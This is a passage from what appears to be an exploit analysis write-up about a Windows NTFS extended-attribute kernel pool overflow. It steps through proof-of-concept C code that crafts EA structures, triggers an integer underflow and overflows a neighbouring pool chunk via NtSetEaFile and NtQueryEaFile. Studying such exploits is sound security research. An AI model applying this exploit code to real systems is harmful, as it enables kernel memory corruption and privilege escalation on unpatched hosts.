eadata2->EaValueLength = (USHORT)eadata2_chunk_sz;
memcpy(eadata2->EaName, EANAME2, eadata2->EaNameLength);
memcpy(eadata2->EaName + eadata2->EaNameLength + 0x1, eadata2_data, eadata2_data_sz); _NtSetEaFile(file, &x, eadata1, 0x300); NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, selector, 0x300, NULL, TRUE); Thus, we also will look at the following excerpt from Y3A's blogpost: The way of calculating NextEntryOffset is taken from the decompiled NtfsQueryEaUserEaList above. 0x9 bytes for the size of all the field members excluding actual data, adding 0x3 to ensure the buffer will not shrink when aligning it to 0x4 bytes with a bitwise AND. If we want an integer underflow, out_buf_length must be smaller than padding while dealing with the second Ea list. The smallest out_buf_length we can achieve is 0x1, which is when the size we specified is 1 byte larger than our first Ea list. The largest padding size we can achieve is 0x3. Using the values in the code above, a namelength of 0x3 and a valuelength of 0x9d makes a total size of 0xa0, which is 4-bytes aligned. Adding 0x9 to it gives us 0xa9, which is one byte off. This means upon adding 0x3 as the final calculation, our padding will be exactly 0x3 bytes. Now that we understand how the payload instantiation of FILE_FULL_EA_INFORMATION works, let's now examine how exactly the overflow occurs using the overflow instantiation of the FILE_FULL_EA_INFORMATION data structure: overflow = (PFILE_FULL_EA_INFORMATION)((UINT64)payload + (UINT64)(payload->NextEntryOffset)); Here, we see that the FILE_FULL_EA_INFORMATION data structure exactly after the payload pointer is then assigned to overflow. overflow->NextEntryOffset = (ULONG)0x0; Next, we see that the NextEntryOffset is then set to 0x0, indicating that there are no other entries beyond overflow. overflow->Flags = (UCHAR)0x0; As with payload, we set the EaNameLength member for overflow to the length of the ExtendedAttribute name, in the case for overflow, it's the length of EANAME2 which is the string bcd. overflow->EaNameLength = (UCHAR)strlen(EANAME2); Next, the input argument overflow_chunk_sz is used to set the EaValueLength. According to Y3A's proof-of-concept, the value of overflow_chunk_sz is 0x18. This is done to match the second memcpy operation for the size of the overflow chunk. overflow->EaValueLength = (USHORT)overflow_chunk_sz; We then see that a memcpy operation is performed at EaName where the value EANAME2 is copied of size EaNameLength. memcpy(overflow->EaName, EANAME2, overflow->EaNameLength); Finally, we then perform a memcpy to overflow the first 0x10 bytes after the next pool header, which equates to 0x20 bytes. memcpy(overflow->EaName + overflow->EaNameLength + 0x1, overflow_data, overflow_data_sz); We then assign the target file the payload ExtendedAttribute . Before analyzing the arguments used, let's first look at the function prototype for NtSetEaFile from NTInternals : NtSetEaFile( IN HANDLE FileHandle, OUT PIO_STATUS_BLOCK IoStatusBlock, IN PVOID EaBuffer, IN ULONG EaBufferSize
); Now, let's examine the implementation within overflow_chunk: file: The handle FileHandle, in our case set to the file we created at c:\\users\\chenl\\desktop\\ABC.txt. &x: The pointer to the output IoStatusBlock structure. payload: A pointer to the target EaBuffer. 0x300: The size of the target EaBuffer. Let's now look at the call to NtSetEaFile in overflow_chunk: status = _NtSetEaFile(file, &x, payload, 0x300);
if (!NT_SUCCESS(status)) { log_warn("overflow_chunk::_NtSetEaFile()1"); goto out;
} We move onto the call to NtQueryEaFile: status = _NtQueryEaFile(file, &x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
if (!NT_SUCCESS(status)) { log_warn("overflow_chunk::_NtQueryEaFile()1"); goto out;
} As with NtSetEaFile, let's examine the function prototype from NTInternals : NtQueryEaFile( IN HANDLE FileHandle, OUT PIO_STATUS_BLOCK IoStatusBlock, OUT PVOID Buffer, IN ULONG Length, IN BOOLEAN ReturnSingleEntry, IN PVOID EaList OPTIONAL, IN ULONG EaListLength, IN PULONG EaIndex OPTIONAL, IN BOOLEAN RestartScan
); Now, let's examine the implementation within overflow_chunk: file: The handle FileHandle, in our case set to the file we created at c:\\users\\chenl\\desktop\\ABC.txt. &x: The pointer to the output IoStatusBlock structure. fetched_data: A pointer to the output Buffer. 0xaa: The length of the buffer in bytes. FALSE: Do not return a single entry only. vuln_selector: The list of FILE_GET_EA_INFORMATION structures which contain the names of the file's ExtendedAttributes . 0x300: The length of the EaList in bytes. NULL: The pointer to the index of the file's ExtendedAttribute structure. TRUE: Return the first queried ExtendedAttribute . Now that we have examined each and every function call in overflow_chunk, let's now look at the cleanup: puts("[+] Overflowed into neighbouring chunk"); out:
if (file && file != INVALID_HANDLE_VALUE) CloseHandle(file); if (fetched_data) free(fetched_data); if (vuln_selector) free(vuln_selector); if (payload) free(payload); return status; We see that we close the file handle and free the memory regions that were used in overflow_chunk.

